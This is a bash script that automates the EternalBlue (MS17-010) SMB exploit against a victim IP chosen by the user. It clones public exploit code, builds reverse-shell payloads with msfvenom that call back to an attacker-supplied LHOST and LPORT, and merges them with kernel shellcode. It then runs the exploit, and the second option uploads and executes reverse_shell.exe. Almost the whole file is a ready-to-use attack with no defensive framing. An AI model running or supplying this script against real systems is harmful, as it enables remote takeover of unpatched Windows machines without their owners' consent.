#!/bin/bash
echo "================================================"
echo "Exploiting Eternal Blue (wihtout Metasploit) :"
echo "================================================"
echo 
echo

echo -n "victim ip : "
read victim_ip
victim_port=445

echo
echo Select Eternal Blue Exploit:
echo "1. For exploiting : 42031.py	[May reboot system.]	(https://www.exploit-db.com/exploits/42031) "
echo "2. For exploiting : 42315.py	[More relible but May require username if anonymous login dont perit IPC$ share access.] (https://www.exploit-db.com/exploits/42315) "
echo
echo -n Enter your choice :
read answer
echo


echo "=>Generating reverse_shell Payload:"
echo -n "Enter LHOST : "
read lhost
echo -n "Enter LPORT : "
read lport
echo
echo "Start your nc listner in new tab"
echo

if [ $answer -eq 1 ]
then
	#echo "=> Downloading exploit from exploitdb:  https://www.exploit-db.com/exploits/42031"
	#wget https://www.exploit-db.com/raw/42031 -O 42031.py
	#wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/42030.asm -O eternalblue_kshellcode_x86.asm
	#wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/42031.asm -O eternalblue_kshellcode_x64.asm	
	echo "=> Cloning github repo https://github.com/worawit/MS17-010.git  (Ref: https://www.exploit-db.com/exploits/42031)"
	git clone https://github.com/worawit/MS17-010.git >&/dev/null
	echo
	echo
	echo "Generating 64 bit payload: " 
	echo "msfvenom -p windows/x64/shell_reverse_tcp LPORT=$lport LHOST=$lhost --platform windows -a x64 --format raw -o MS17-010/shellcode/sc_x64_payload.bin"
	nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o MS17-010/shellcode/sc_x64_kernel.bin
	msfvenom -p windows/x64/shell_reverse_tcp LPORT=$lport LHOST=$lhost --platform windows -a x64 --format raw -o MS17-010/shellcode/sc_x64_payload.bin
	cat MS17-010/shellcode/sc_x64_kernel.bin MS17-010/shellcode/sc_x64_payload.bin > MS17-010/shellcode/sc_x64.bin

	echo
	echo "Generating 32 bit payload:"
	echo "msfvenom -p windows/shell_reverse_tcp LPORT=$lport LHOST=$lhost --platform windows -a x86 --format raw -o MS17-010/shellcode/sc_x86_payload.bin"
	nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o MS17-010/shellcode/sc_x86_kernel.bin
	msfvenom -p windows/shell_reverse_tcp LPORT=$lport LHOST=$lhost --platform windows -a x86 --format raw -o MS17-010/shellcode/sc_x86_payload.bin
	cat MS17-010/shellcode/sc_x86_kernel.bin MS17-010/shellcode/sc_x86_payload.bin > MS17-010/shellcode/sc_x86.bin
	echo

	#Merging both shell codes:
	python MS17-010/shellcode/eternalblue_sc_merge.py MS17-010/shellcode/sc_x86.bin MS17-010/shellcode/sc_x64.bin MS17-010/shellcode/sc_all.bin

	#exploit:
	python MS17-010/eternalblue_exploit7.py $victim_ip MS17-010/shellcode/sc_all.bin

	#Handler:
	#echo Starting Reverse Handler:
	#echo "nc -nlvp $lport" &
	#nc -nlvp $lport

elif [ $answer -eq 2 ]
then
	#curl https://www.exploit-db.com/raw/42315 -s -o 42315.py
	#curl https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py -s -o mysmb.py
	echo "==> Using exploit of exploit-db (https://www.exploit-db.com/raw/42315 )"
	echo -n "Username (Press Enter for default): "
	read smb_username
	echo -n "Password (Press Enter for default): "
	read smb_password
	
	#Exporting username & password into environment variable & used by 42315.py:
	export smb_username
	export smb_password
	
	echo
	echo "Generating 32 bit payload:"
	echo msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -f exe -a x86 --platform windows -o reverse_shell.exe
	msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -f exe -a x86 --platform windows -o reverse_shell.exe
	echo
	#Replacing username & password in 42315.py:
	#sed -i s/secret_username/$username/g 42315.py
	#sed -i s/secret_password/$password/g 42315.py
	#Adding these two lines: 
	#smb_send_file(smbConn, 'reverse_shell.exe','C','/windows/temp/reverse_shell.exe')
   	#service_exec(conn, r'cmd /c c:\\windows\temp\reverse_shell.exe')
	#sed -i '922i \\tsmb_send_file(smbConn, "reverse_shell.exe", "C" ,"/windows/temp/reverse_shell.exe")' 42315.py
	#sed -i '923i \\tservice_exec(conn, r"cmd /c c:\\\\windows\\temp\\reverse_shell.exe")' 42315.py

	#exploit
	python 42315.py $victim_ip 
	
	#Handler:
	#echo Starting Reverse Handler:
	#echo "nc -nlvp $lport" 
	#nc -nlvp $lport 
else 
	echo Invalid choice
fi
